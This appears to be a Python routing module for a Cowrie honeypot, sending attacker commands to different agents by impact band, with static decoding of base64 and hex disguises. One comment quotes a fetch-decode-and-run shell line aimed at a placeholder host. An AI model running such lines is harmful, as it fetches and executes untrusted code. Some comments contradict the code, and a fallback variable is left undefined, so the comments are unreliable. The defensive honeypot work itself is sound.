import re

import sys, os
# Repo root, not core/ -- this goes on sys.path and locates config.yaml.
_HERE = os.path.abspath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)), ".."))
sys.path.insert(0, _HERE)
from prompt.fi_manager import FIScorer
from core.config_loader import load_config

# ─── Editable routing config — config.yaml is the live source of truth ───────
# fi_routing/agents.*.enabled are read from config.yaml, not hardcoded here —
# an operator can hand-edit config.yaml (e.g. "0: cloud") and classify() will
# honor it immediately, no code change needed. Resolved via router.py's own
# file location (not cwd-relative "config.yaml") so this works regardless of
# which script imports router.py or what its working directory is.
_CONFIG_PATH = os.path.join(_HERE, "config.yaml")
try:
    _config = load_config(_CONFIG_PATH)
    _AGENTS_ENABLED = {
        "cowrie":    _config.agents.cowrie.enabled,
        "on_device": _config.agents.on_device.enabled,
        "cloud":     _config.agents.cloud.enabled,
    }
    _FI_ROUTING = {int(k): v for k, v in dict(_config.routing.fi_routing).items()}
    _FALLBACK   = _config.routing.fallback
    _FI_FALLBACK = int(_config.routing.fi_fallback)
except Exception:
    # config.yaml not found yet (e.g. router.py imported before `hp --init`) —
    # fall back to today's 3-agent default so nothing breaks at import time
    _AGENTS_ENABLED = {"cowrie": True, "on_device": True, "cloud": True}
    _FI_ROUTING = {0: "cowrie", 1: "cowrie", 2: "on_device", 3: "on_device", 4: "on_device"}
    _FI_FALLBACK = 3

# Single shared scorer — FIScorer.score() is a pure function of the command
# text (hardcoded regex bands, no session state), so one module-level
# instance is safe to share across every session's classify() calls. Text
# that matches no FI_RULES pattern (e.g. garbled obfuscation output that
# _deobfuscate() below can't unwrap) gets _FI_FALLBACK, not a silent FI0 —
# unrecognized input should escalate, not default to the weakest agent.
_scorer = FIScorer(fallback_fi=_FI_FALLBACK)

# capability rank, weakest to strongest — used only as a fallback when the
# configured target for a band isn't actually enabled, or cloud/on_device is
# unavailable for a mechanism-based override (obfuscation / COWRIE_UNIMPLEMENTED)
_RANK = {"cowrie": 0, "on_device": 1, "cloud": 2}


def _strongest(agents: list) -> str:
    return max(agents, key=lambda a: _RANK.get(a, -1)) if agents else "cowrie"

# ─── Group 0: Cowrie coverage gap ─────────────────────────────────────────────
# These binaries have no Python command-class handler in this Cowrie instance
# — invoking any of them always fails with the same generic fallback error
# ("cannot execute binary file: Exec format error"), regardless of arguments.
# Verified empirically against the live Cowrie connection (fresh connection
# per command, no session-state carryover): 70/161 declared base_tools were
# tested this way and every one of these failed 100% of the time (multiple
# tested with 4-29 real occurrences each in dataset/mrheinen_linux_commands.json
# ground truth, always failing). Since several of these would otherwise score
# an FI band that routes to cowrie (e.g. diff, ln, file, stat, arp, ip), this
# check must run BEFORE the FI-band lookup so these specific binaries route
# to on_device instead — any LLM-fabricated answer is strictly better than a
# guaranteed-wrong error.
COWRIE_UNIMPLEMENTED = {
    "arch", "arp", "basename", "blkid", "cal", "cmp", "column", "comm",
    "diff", "dirname", "expr", "fdisk", "file", "findmnt", "flock", "fold",
    "getent", "getopt", "gpg", "hexdump", "install", "ionice", "ip", "kmod",
    "laptop-detect", "lastlog", "linux-version", "ln", "lnstat", "logger",
    "logname", "lsblk", "lsusb", "mkfifo", "mktemp", "mountpoint", "namei",
    "nice", "nl", "nstat", "paste", "pgrep", "pmap", "printenv", "pwdx",
    "readlink", "renice", "rev", "route", "routel", "rpcinfo", "seq",
    "split", "ss", "ssh-keygen", "stat", "sysctl", "tac", "taskset", "tc",
    "tempfile", "test", "timeout", "tload", "traceroute", "truncate", "tty",
    "vdir", "vmstat", "whereis",
}


# The inverse of COWRIE_UNIMPLEMENTED: commands Cowrie performs FOR REAL, so
# routing them anywhere else makes the honeypot less convincing, not more.
#
# Cowrie opens the socket, fetches the bytes, and registers the file in its
# filesystem. CowrieAgent holds ONE persistent shell per attacker session, so
# a later `cat` (FI 0 -> cowrie) reads that same filesystem and returns the
# real content. Verified 2026-08-31 against the live backend:
#
#     $ wget https://.../README.md   ->  Saving to: `/root/README.md'
#     $ ls -la README.md             ->  -rw-r--r-- 1 root root 5278 ...
#     $ cat /root/README.md          ->  # ATT&CK(R) STIX Data ...
#
# Their FI band is 3 (Download), which fi_routing sends to on_device. The LLM
# then writes a flawless transfer log and saves nothing, so the attacker's next
# `cat` says "No such file or directory" — a giveaway in two commands.
#
# Only wget and curl are listed. Cowrie also ships tftp and ftpget, but there
# was no local TFTP/FTP server to verify them against, and an unverified entry
# here would silently route a command to an agent that cannot handle it.
#
# `cd` joins them for the same reason, found by measurement: Cowrie owns the
# real tree and knows ~26,000 paths we never declared, so only it can say
# whether a directory exists. On Part C's FI2 commands Cowrie answered
# `cd .systemd-private-service` with the real "No such file or directory"
# while our own handler reported success, and Cowrie scored 4.41 against the
# handler's 3.28. Its persistent per-session shell also carries the resulting
# cwd for every later cowrie-routed command.
COWRIE_AUTHORITATIVE = {"wget", "curl", "cd"}


def _base_cmd(cmd: str) -> str:
    stripped = cmd.strip()
    return stripped.split()[0] if stripped else ""


# ─── Cowrie vs on_device: driven by FI band, not pattern lists ───────────────
# Which of {cowrie, on_device} a non-cloud command routes to is now decided
# entirely by FIScorer's band for that command (see classify() below):
#   FI 0   → cowrie      (read/display)
#   FI 1-2 → on_device   (create file/install tool, modify/navigate/change shell)
#   FI 3-4 → cloud       (service/download/elevate, destructive/persistence)
# The table itself lives in config.yaml `routing.fi_routing` — these bands are a
# description of it, not a second source of truth.
# FI_RULES in prompt/fi_manager.py is the single source of truth for this —
# no separate pattern lists here anymore. Any command previously routed by
# BASIC_PATTERNS/ONDEVICE_PATTERNS now needs its FI band correct in FI_RULES
# instead of a duplicate regex here.


# ─── Deobfuscation ───────────────────────────────────────────────────────────
# Unwrap disguises so the FI scorer sees the real command, not the wrapper.
# Static string decoding only — never runs a shell.
import base64 as _b64

# `echo <b64> | base64 -d`  (and openssl / --decode spellings)
_B64_PIPE = re.compile(
    r"echo\s+(?:-[neE]+\s+)?['\"]?([A-Za-z0-9+/=]{8,})['\"]?\s*\|\s*"
    r"(?:openssl\s+(?:enc\s+)?)?base64\s+(?:-d|--decode|-di|-d\s+-i)")
# `printf '\x63\x61\x74'` or any run of \xNN
_HEX_RUN = re.compile(r"(?:\\x[0-9a-fA-F]{2}){3,}")
# `$(echo cat)` or `` `echo cat` ``  — only when the inner command is a literal echo
_ECHO_SUBST = re.compile(r"\$\(\s*echo\s+(?:-[neE]+\s+)?([^)]*)\)"
                         r"|`\s*echo\s+(?:-[neE]+\s+)?([^`]*)`")


def _b64_decode_match(m):
    try:
        return _b64.b64decode(m.group(1), validate=False).decode("utf-8", "replace")
    except Exception:
        return m.group(0)


def _hex_decode_match(m):
    pairs = re.findall(r"\\x([0-9a-fA-F]{2})", m.group(0))
    try:
        return bytes(int(h, 16) for h in pairs).decode("utf-8", "replace")
    except Exception:
        return m.group(0)


def _deobfuscate(cmd: str, _depth: int = 0) -> str:
    """Unwrap base64/hex/$(echo …) disguises so FI scoring sees the real command."""
    if _depth >= 4:                       # bound nested layers
        return cmd
    out = _B64_PIPE.sub(_b64_decode_match, cmd)
    out = _HEX_RUN.sub(_hex_decode_match, out)
    out = _ECHO_SUBST.sub(lambda m: (m.group(1) or m.group(2) or "").strip(), out)
    return _deobfuscate(out, _depth + 1) if out != cmd else out


# ─── Classifier ──────────────────────────────────────────────────────────────

def classify(cmd: str, session_history: list) -> str:
    cmd = cmd.strip()

    enabled = [a for a in ("cowrie", "on_device", "cloud") if _AGENTS_ENABLED.get(a, True)]
    if not enabled:
        enabled = ["cowrie"]   # safety net — should never happen, but never route nowhere

    # Single-agent mode: HoneyRouter has no choice to make — everything goes
    # to the one agent that's actually enabled, no exceptions.
    if len(enabled) == 1:
        return enabled[0]

    # Route obfuscated commands by their DECODED FI band, not the disguise, so
    # harmless ones stay cheap and dangerous ones still escalate.

    # Cowrie coverage gap — this binary always fails on Cowrie regardless of
    # arguments, so never route it there even though its FI band would
    # otherwise send it to cowrie. Specifically on_device, not "whatever's
    # strongest" — these are ordinary low-impact commands Cowrie just can't
    # execute, not commands that need cloud-grade semantic reconstruction;
    # sending them to cloud would be an expensive, unintended escalation.
    if _base_cmd(cmd) in COWRIE_UNIMPLEMENTED:
        if "on_device" in enabled:
            return "on_device"
        return _strongest([a for a in enabled if a != "cowrie"])

    # Cowrie does this one for real — see COWRIE_AUTHORITATIVE. Checked AFTER
    # the obfuscation test above, so `wget http://x/p.sh | base64 -d | sh`
    # still escalates to cloud; only a plain transfer is handed to Cowrie.
    if _base_cmd(cmd) in COWRIE_AUTHORITATIVE and "cowrie" in enabled:
        return "cowrie"

    # FI band decides the rest — via config.yaml's fi_routing table (see
    # prompt/fi_manager.py for the FI score itself; fi_routing for which
    # agent each band maps to, fully hand-editable). Falls back to the
    # strongest enabled agent if the configured target isn't actually
    # available (e.g. hand-edited to an agent that got disabled since).
    fi, _ = _scorer.score(_deobfuscate(cmd))
    target = _FI_ROUTING.get(fi, _FALLBACK)
    return target if target in enabled else _strongest(enabled)


if __name__ == "__main__":
    test_cmds = ["hello", "hey", "hi", "wtf", "what"]
    for cmd in test_cmds:
        result = classify(cmd, [])
        fi, method = _scorer.score(cmd)
        print(f"{cmd!r} → {result}  (FI={fi}, {method})")